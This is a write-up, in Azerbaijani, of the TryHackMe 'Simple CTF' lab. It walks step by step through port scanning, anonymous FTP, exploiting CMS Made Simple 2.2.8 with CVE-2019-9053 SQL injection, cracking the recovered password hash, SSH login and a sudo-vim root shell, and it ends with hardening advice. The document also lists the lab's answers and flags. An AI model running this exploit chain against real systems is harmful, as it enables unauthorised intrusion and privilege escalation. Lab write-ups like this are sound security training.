# 🏁 TryHackMe — Simple CTF Writeup (Azərbaycanca)

> **Çətinlik:** Başlanğıc (Beginner)  
> **Vaxt:** ~45 dəqiqə  
> **Hədəf:** user.txt və root.txt flaglarını tapmaq  
> **Texnologiya:** FTP, CMS Made Simple 2.2.8, SQL Injection, SSH, Vim privesc

---

## 📋 CTF Sualları və Cavabları

| Sual | Cavab |
|------|-------|
| Port 1000-dən aşağıda neçə servis işləyir? | 2 |
| Yüksək portda nə işləyir? | SSH |
| CVE nömrəsi nədir? | CVE-2019-9053 |
| Hansı növ zəiflikdir? | SQLi |
| Şifrə nədir? | secret |
| Harada login ola bilərsiniz? | SSH |
| User flag | user.txt |
| Başqa istifadəçinin adı? | sunbath |
| Privileged shell üçün nə istifadə edə bilərsiniz? | vim |
| Root flag | root.txt |

---

## Addım 1 — Port Skanlaması (Nmap)

Hər CTF-in başında hədəf maşında hansı portların açıq olduğunu öyrənirik.

```bash
nmap -sC -sV -p- -T4 <TARGET_IP>
```

**Nəticə:**

```
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
80/tcp   open  http    Apache httpd 2.4.18
2222/tcp open  ssh     OpenSSH 7.2p2
```

Üç port açıqdır:

| Port | Servis | Qeyd |
|------|--------|------|
| 21   | FTP    | Anonymous login var |
| 80   | HTTP   | Web server |
| 2222 | SSH    | Normal 22 deyil, 2222-dədir! |

> **Sual 1 cavabı:** Port 1000-dən aşağıda 2 servis var (FTP=21, HTTP=80)  
> **Sual 2 cavabı:** Yüksək portda SSH işləyir (port 2222)

---

## Addım 2 — FTP-yə Anonymous Giriş

Port 21-də FTP var. Anonim giriş sınayırıq:

```bash
ftp <TARGET_IP>
```

```
Name: anonymous
Password: (boş burax, Enter bas)
```

FTP-yə daxil oluruq. Faylları yoxlayırıq:

```bash
ls -la
cd pub
ls
get ForMitch.txt
```

**ForMitch.txt faylının məzmunu:**

```
Dude, seriously ?! You have the same username as your name and a WEAK password !
Change it NOW and stop using stupid lame passwords !
```

Bu mesaj bizə ipucu verir: istifadəçi adı **mitch**, şifrə isə zəifdir.

---

## Addım 3 — Web Saytını Analiz Etmək

Brauzerdə `http://<TARGET_IP>` açırıq → **Default Apache2 səhifəsi** görünür, birbaşa faydalı məlumat yoxdur.

### Gobuster ilə gizli qovluqları tapaq:

```bash
gobuster dir -u http://<TARGET_IP>/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

**Tapılan:**

```
/simple  → CMS Made Simple
/robots.txt
```

`http://<TARGET_IP>/simple` ünvanını açırıq.

Qarşımıza **CMS Made Simple** saytı çıxır. Sayfanın ən aşağısında versiya yazılıb:

```
CMS Made Simple version 2.2.8
```

---

## Addım 4 — Zəiflik Axtarışı (CVE-2019-9053)

CMS Made Simple 2.2.8 versiyası üçün exploit axtarırıq:

```bash
searchsploit "CMS Made Simple"
```

**Tapılan exploit:**

```
CMS Made Simple < 2.2.10 - SQL Injection    | php/webapps/46635.py
```

**CVE nömrəsi:** CVE-2019-9053  
**Zəiflik növü:** SQL Injection (Time-Based Blind SQLi)

> **Sual 3 cavabı:** CVE-2019-9053  
> **Sual 4 cavabı:** SQLi

### SQL Injection nədir?

Hücumçu verilənlər bazasına birbaşa SQL kodu göndərir. Bu halda `moduleinterface.php` endpointindəki `m1_idlist` parametri düzgün sanitasiya edilmir. Hücumçu cavab vaxtındakı gecikmələri ölçərək verilənləri hərfbəhərf çıxarır — buna **Time-Based Blind SQL Injection** deyilir.

---

## Addım 5 — SQL Injection Exploitini İşlətmək

Exploit skriptini kopyalayırıq:

```bash
searchsploit -m 46635
mv 46635.py exploit.py
```

**Əgər `termcolor` xətası verirsə:**

```bash
pip install termcolor
```

**Exploiti işlədirik:**

```bash
python3 exploit.py -u http://<TARGET_IP>/simple --crack -w /usr/share/wordlists/rockyou.txt
```

> **Qeyd:** Bu skript yavaş işləyir çünki Time-Based SQLi-dir. Bir neçə dəqiqə gözlə.

**Nəticə:**

```
[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
[+] Password cracked: secret
```

> **Sual 5 cavabı:** Şifrə — `secret`  
> **Sual 6 cavabı:** SSH ilə login ola bilərik

---

## Addım 6 — SSH ilə Giriş

İndi SSH vasitəsilə sisteme daxil oluruq. Diqqət: **port 2222**-dir, standart 22 deyil!

```bash
ssh mitch@<TARGET_IP> -p 2222
```

```
Password: secret
```

✅ **Sistemə daxil olduq!**

---

## Addım 7 — User Flagını Tapmaq

```bash
ls
cat user.txt
```

```
G00d j0b, keep up!
```

🏁 **User flag tapıldı!**

> **Sual 7 cavabı:** user.txt flagı

---

## Addım 8 — Digər İstifadəçiləri Yoxlamaq

```bash
ls /home/
```

```
mitch  sunbath
```

> **Sual 8 cavabı:** Başqa istifadəçi — `sunbath`

---

## Addım 9 — Privilege Escalation (Root-a Qalxmaq)

İlk növbədə `sudo -l` ilə `mitch` istifadəçisinin nə edə biləcəyini yoxlayırıq:

```bash
sudo -l
```

**Nəticə:**

```
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim
```

`mitch` istifadəçisi **vim**-i root kimi şifrəsiz işlədə bilir!

> **Sual 9 cavabı:** `vim` — privileged shell üçün istifadə edə bilərik

### GTFOBins — Vim ilə Root Shell

[GTFOBins](https://gtfobins.github.io/gtfobins/vim/#sudo) saytına görə, `sudo vim` ilə root shell almaq mümkündür.

**Metod 1 — Vim daxilindən shell açmaq:**

```bash
sudo vim -c ':!/bin/bash'
```

**Metod 2 — Vim açıb içindən komanda:**

```bash
sudo vim
```

Vim açıldıqdan sonra bu komandanı yazırıq:

```
:!/bin/bash
```

Enter basırıq → **Root shell açılır!**

```bash
whoami
# root
id
# uid=0(root) gid=0(root) groups=0(root)
```

✅ **Root oldunuq!**

---

## Addım 10 — Root Flagını Tapmaq

```bash
cat /root/root.txt
```

```
W3ll d0n3. You made it!
```

🏆 **Root flag tapıldı! CTF tamamlandı!**

---

## 🔍 İstifadə Olunan Zəifliklər — Xülasə

| Zəiflik | Mərhələ | Şiddət |
|---------|---------|--------|
| FTP Anonymous Login | İlk məlumat toplama | 🟡 Orta |
| CVE-2019-9053 — SQL Injection | İstifadəçi adı/şifrə əldə etmək | 🔴 Kritik |
| Zəif şifrə (`secret`) | Şifrə crack | 🔴 Kritik |
| Sudo Vim Misconfiguration | Root-a qalxmaq | 🔴 Kritik |

---

## 🛡️ Tövsiyələr

1. **FTP Anonymous girişini bağlayın** — İstifadəçi məlumatları olan faylları FTP-də saxlamayın.
2. **CMS-i güncəlləyin** — CMS Made Simple 2.2.10+ versiyasına keçin.
3. **Güclü şifrə istifadə edin** — `secret` kimi sadə şifrələr saniyələr içində crack olunur.
4. **Sudo siyasətini nəzərdən keçirin** — `vim`, `nano`, `less` kimi redaktorlara sudo icazəsi VERMƏYİN. Bunlar GTFOBins vasitəsilə root-a keçid üçün istifadə olunur.
5. **SSH portunu standart saxlayın** — Port 2222 "gizlətmə" deyil, sadəcə gecikdirmə strategiyasıdır.

---

## 🧰 İstifadə Olunan Alətlər

| Alət | Məqsəd |
|------|--------|
| `nmap` | Port skanlaması |
| `ftp` | Anonymous FTP girişi |
| `gobuster` | Web qovluq taraması |
| `searchsploit` | CVE exploit axtarışı |
| `exploit.py (46635)` | SQL Injection ilə şifrə çıxarmaq |
| `ssh` | Sisteme giriş |
| `sudo vim` | Privilege Escalation |
| GTFOBins | Vim ilə root shell texnikası |

---

## 📖 Öyrənilən Mövzular

- Port skanlaması və servis tərifi
- FTP anonim girişi və fayl analizi
- Web qovluq taraması (Gobuster)
- SQL Injection — Time-Based Blind
- Şifrə cracking (wordlist ilə)
- SSH ilə uzaq giriş
- Sudo misconfiguration aşkarlanması
- GTFOBins istifadəsi — Vim privesc

---

*Bu writeup yalnız təhsil məqsədilə hazırlanmışdır. Hər zaman icazəli sistemlərə qarşı test edin.*
